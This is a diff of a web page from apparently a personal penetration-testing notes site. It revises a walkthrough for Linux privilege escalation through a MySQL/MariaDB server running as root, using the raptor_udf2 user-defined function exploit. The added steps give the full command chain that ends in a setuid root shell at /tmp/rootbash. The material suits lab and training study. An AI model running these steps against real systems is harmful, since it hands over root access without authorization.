@@ -11,28 +11,28 @@
     <!-- Primary Meta Tags -->
     <title>MySQL 4.x/5.x</title>
     <meta name="title" content="MySQL 4.x/5.x">
-    <meta name="description" content="Example MySQL 4.x/5.0 User-Defined Function" />
+    <meta name="description" content="Check MySQL configuration:" />
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://caueb.github.io/linuxprivesc/mysql4x8a1a7/">
     <meta property="og:title" content="MySQL 4.x/5.x">
-    <meta property="og:description" content="Example MySQL 4.x/5.0 User-Defined Function">
+    <meta property="og:description" content="Check MySQL configuration:">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
     <meta property="twitter:url" content="https://caueb.github.io/linuxprivesc/mysql4x8a1a7/">
     <meta property="twitter:title" content="MySQL 4.x/5.x">
-    <meta property="twitter:description" content="Example MySQL 4.x/5.0 User-Defined Function">
+    <meta property="twitter:description" content="Check MySQL configuration:">
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="/resources/css/retype.css?v=2.2.704948330531" rel="stylesheet" data-turbo-track="reload" />
+    <link href="/resources/css/retype.css?v=2.2.705379040081" rel="stylesheet" data-turbo-track="reload" />
 
-    <script type="text/javascript" src="/resources/js/config.js?v=2.2.704948330531" defer data-turbo-track="reload"></script>
+    <script type="text/javascript" src="/resources/js/config.js?v=2.2.705379040081" defer data-turbo-track="reload"></script>
     <script type="text/javascript" src="/resources/js/retype.js?v=2.2" defer data-turbo-track="reload"></script>
-    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.2.704948330531" defer></script>
-    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=2.2.704948330531" defer></script>
+    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.2.705379040081" defer></script>
+    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=2.2.705379040081" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -197,57 +197,88 @@
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">$ ps aux | grep &quot;^root&quot;</code></pre>
 </doc-codeblock></div>
-<p>Example MySQL 4.x/5.0 User-Defined Function</p>
-<doc-anchor-target id="compile-and-convert-the-exploit-to-64-bit">
+<p>Check MySQL configuration:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ cat /etc/mysql/mariadb.conf.d/50-server.cnf | grep -v &quot;#&quot; | grep &quot;user&quot;
+user = root</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="prepare-the-exploit">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#compile-and-convert-the-exploit-to-64-bit">#</doc-anchor-trigger>
-        <span>Compile and Convert the exploit to 64-bit</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#prepare-the-exploit">#</doc-anchor-trigger>
+        <span>Prepare the exploit</span>
     </h2>
 </doc-anchor-target>
+<doc-anchor-target id="download-and-compile-it">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#download-and-compile-it">#</doc-anchor-trigger>
+        <span>Download and compile it</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Exploit: <a href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></li>
+</ul>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ gcc -g -c raptor_udf2.c -fPIC</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">$ gcc -g -c raptor_udf2.c
+$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="create-a-shared-object-from-the-compiled-exploit">
+<doc-anchor-target id="create-mysql-function">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#create-a-shared-object-from-the-compiled-exploit">#</doc-anchor-trigger>
-        <span>Create a shared object from the compiled exploit</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#create-mysql-function">#</doc-anchor-trigger>
+        <span>Create MySQL function</span>
     </h2>
 </doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ gcc -g -shared -Wl, -soname,raptor_udf2.so -o raptor_udf2.so raptor_idf2.p -lc</code></pre>
-</doc-codeblock></div>
 <doc-anchor-target id="connect-to-mysql">
-    <h2>
+    <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#connect-to-mysql">#</doc-anchor-trigger>
-        <span>Connect to mySQL</span>
-    </h2>
+        <span>Connect to MySQL</span>
+    </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">$ mysql -u root -p</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="steps-to-load-the-shared-object-into-mysql">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#steps-to-load-the-shared-object-into-mysql">#</doc-anchor-trigger>
-        <span>Steps to load the shared object into MySQL</span>
-    </h2>
+<doc-anchor-target id="find-the-plugins-directory">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#find-the-plugins-directory">#</doc-anchor-trigger>
+        <span>Find the plugins directory</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">mysql&gt; show variables like 'plugin_dir';
++---------------+---------------------------------------------+
+| Variable_name | Value                                       |
++---------------+---------------------------------------------+
+| plugin_dir    | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
++---------------+---------------------------------------------+</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="load-the-shared-object-into-mysql">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#load-the-shared-object-into-mysql">#</doc-anchor-trigger>
+        <span>Load the shared object into MySQL</span>
+    </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">mysql&gt; use mysql;
 mysql&gt; create table foo(line blob);
-mysql&gt; insert into foo values(load_file('/home/mrfart/raptor_udf2.so';);
-mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so':
+mysql&gt; insert into foo values(load_file('/tmp/raptor_udf2.so';);
+mysql&gt; select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
 mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';
 mysql&gt; select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
 mysql&gt; exit</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="execute-rootbash-shell">
+<doc-anchor-target id="get-root-shell">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#execute-rootbash-shell">#</doc-anchor-trigger>
-        <span>Execute rootbash shell</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#get-root-shell">#</doc-anchor-trigger>
+        <span>Get root shell</span>
     </h2>
 </doc-anchor-target>
+<doc-anchor-target id="execute-rootbash-shell">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#execute-rootbash-shell">#</doc-anchor-trigger>
+        <span>Execute rootbash shell</span>
+    </h3>
+</doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ /tmp/rootbash</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">$ /tmp/rootbash -p</code></pre>
 </doc-codeblock></div>
 
                                 
